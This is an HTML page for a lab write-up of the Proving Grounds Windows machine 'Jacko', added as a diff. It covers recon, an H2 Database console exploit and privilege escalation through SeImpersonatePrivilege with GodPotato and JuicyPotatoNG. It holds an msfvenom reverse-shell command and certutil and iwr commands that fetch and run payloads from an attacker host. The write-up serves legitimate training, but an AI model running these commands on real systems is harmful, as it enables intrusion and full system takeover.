@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Jacko Writeup - Rachel Murphy" />
+  <title>PG: Jacko | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre {
+      background: rgba(15,23,36,0.9);
+      padding: 1rem;
+      border-radius: 6px;
+      overflow-x: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Jacko — Writeup</h1>
+      <p class="meta">Proving Grounds — Windows / H2 Database RCE + SeImpersonatePrivilege</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/index.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> “Jacko” is an intermediate-level Windows VM on OffSec’s Proving Grounds Practice platform. It demonstrates a classic attack chain: reconnaissance, exploiting a vulnerable H2 Database Console to get code execution, uploading a reverse shell, and escalating privileges using SeImpersonatePrivilege with GodPotato or JuicyPotatoNG to achieve SYSTEM.</p>
+
+      <h3>Key Features</h3>
+      <ul>
+        <li>Exposed H2 Database Console vulnerable to RCE via Java Native Interface.</li>
+        <li>Hands-on exploitation of SeImpersonatePrivilege for privilege escalation.</li>
+        <li>Ideal for OSCP preparation and practicing Windows post-exploitation techniques.</li>
+      </ul>
+
+      <h3>Typical Approach</h3>
+      <ul>
+        <li><strong>Reconnaissance:</strong> Scan open ports and services using <code>nmap</code>.</li>
+        <li><strong>Initial Access:</strong> Exploit vulnerable H2 Database Console to execute commands.</li>
+        <li><strong>Reverse Shell:</strong> Upload and execute a malicious payload to gain foothold.</li>
+        <li><strong>Privilege Escalation:</strong> Use SeImpersonatePrivilege exploitation (GodPotato/JuicyPotatoNG) to gain SYSTEM.</li>
+        <li><strong>Proof:</strong> Grab <code>proof.txt</code> as SYSTEM.</li>
+      </ul>
+    </section>
+
+    <!-- Nmap -->
+    <section>
+      <h2>NMAP</h2>
+      <p>Started with a full TCP scan to identify exposed services.</p>
+      <pre>sudo nmap -sC -sV 192.168.247.66 -oN nmap-jacko</pre>
+      <img src="../images/Pasted image 20250705214502.png" alt="Nmap default scan" class="screenshot">
+      <p>Enumerated all ports for a complete picture:</p>
+      <img src="../images/Pasted image 20250705214714.png" alt="All ports scan" class="screenshot">
+    </section>
+
+    <!-- SMB -->
+    <section>
+      <h2>SMB</h2>
+      <p>Checked SMB shares for anonymous access. None were accessible (“boo”).</p>
+      <img src="../images/Pasted image 20250705214838.png" alt="SMB scan" class="screenshot">
+    </section>
+
+    <!-- Web -->
+    <section>
+      <h2>Web on Port 8082</h2>
+      <p>Discovered a web service running on port 8082 hosting the H2 Database Console.</p>
+      <img src="../images/Pasted image 20250705214912.png" alt="H2 console" class="screenshot">
+      <h3>Feroxbuster</h3>
+      <p>Ran Feroxbuster to enumerate directories and JSP files:</p>
+      <pre>feroxbuster -u http://192.168.247.66:8082 -x jsp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
+    </section>
+
+    <!-- H2 Database exploit -->
+    <section>
+      <h2>H2 Database Exploit</h2>
+      <p>The H2 version (1.4.199) is vulnerable to RCE via Java Native Interface. Used exploit from Exploit-DB (49384):</p>
+      <a href="https://www.exploit-db.com/exploits/49384" target="_blank">Exploit 49384</a>
+      <img src="../images/Pasted image 20250705220252.png" alt="Exploit execution" class="screenshot">
+      <p>Crafted a malicious SQL statement to execute commands. Next step was establishing a reverse shell.</p>
+    </section>
+
+    <!-- Reverse shell -->
+    <section>
+      <h2>Reverse Shell</h2>
+      <p>Generated a Windows reverse shell payload with msfvenom:</p>
+      <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=9001 -f exe > rev.exe</pre>
+      <p>Uploaded payload to the target using certutil via the exploit:</p>
+      <pre>certutil -split -urlcache -f http://192.168.45.152/rev.exe C:\Users\tony\rev.exe</pre>
+      <img src="../images/Pasted image 20250705225415.png" alt="Payload upload" class="screenshot">
+      <p>Executed the payload to get a shell:</p>
+      <pre>C:\Users\tony\rev.exe</pre>
+      <img src="../images/Pasted image 20250705225757.png" alt="Execution" class="screenshot">
+      <p>Caught the shell successfully:</p>
+      <img src="../images/Pasted image 20250705225826.png" alt="Caught shell" class="screenshot">
+    </section>
+
+    <!-- Privilege Escalation -->
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>Observed <code>SeImpersonatePrivilege</code> on the compromised account, indicating it’s vulnerable to token impersonation exploits like GodPotato.</p>
+      <p>Adjusted PATH to ensure tools run correctly:</p>
+      <pre>set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\</pre>
+      <h3>GodPotato</h3>
+      <p>Checked .NET version to determine correct GodPotato binary:</p>
+      <pre>Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse</pre>
+      <img src="../images/Pasted image 20250706001206.png" alt=".NET version" class="screenshot">
+      <p>Transferred GodPotato-NET4.exe to the target and tested with whoami:</p>
+      <pre>iwr http://192.168.45.152:81/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+.\GodPotato-NET4.exe -cmd "whoami"</pre>
+      <img src="../images/Pasted image 20250706001624.png" alt="GodPotato success" class="screenshot">
+      <p>Generated a second reverse shell and executed it with GodPotato to gain SYSTEM:</p>
+      <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=9002 -f exe > rev2.exe
+iwr http://192.168.45.152:81/rev2.exe -outfile rev2.exe
+.\GodPotato-NET4.exe -cmd "c:\users\tony\Documents\rev2.exe"</pre>
+      <img src="../images/Pasted image 20250706002247.png" alt="Second shell" class="screenshot">
+    </section>
+
+    <section>
+      <h3>JuicyPotatoNG fallback</h3>
+      <p>When GodPotato was unstable, tried JuicyPotatoNG:</p>
+      <pre>.\jp.exe -t * -p "C:\Users\tony\Documents\rev2.exe"</pre>
+      <img src="../images/Pasted image 20250706004609.png" alt="JuicyPotato execution" class="screenshot">
+      <p>Caught a SYSTEM shell and retrieved proof.txt:</p>
+      <img src="../images/Pasted image 20250706004649.png" alt="Caught system shell" class="screenshot">
+      <img src="../images/Pasted image 20250706004702.png" alt="Proof.txt" class="screenshot">
+    </section>
+
+    <section>
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li>Enumerate web services thoroughly — H2 Database consoles often hide in high ports.</li>
+        <li>Exploit default credentials and known RCE exploits to gain initial access.</li>
+        <li>Use certutil or PowerShell cradles to upload payloads post-exploitation.</li>
+        <li>SeImpersonatePrivilege is a golden ticket for SYSTEM escalation on Windows.</li>
+        <li>Have fallback escalation exploits (GodPotato, PrintSpoofer, JuicyPotatoNG) ready.</li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a></p>
+      <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="/index.html">Home</a></p>
+    </div>
+  </footer>
+
+</body>
+</html>
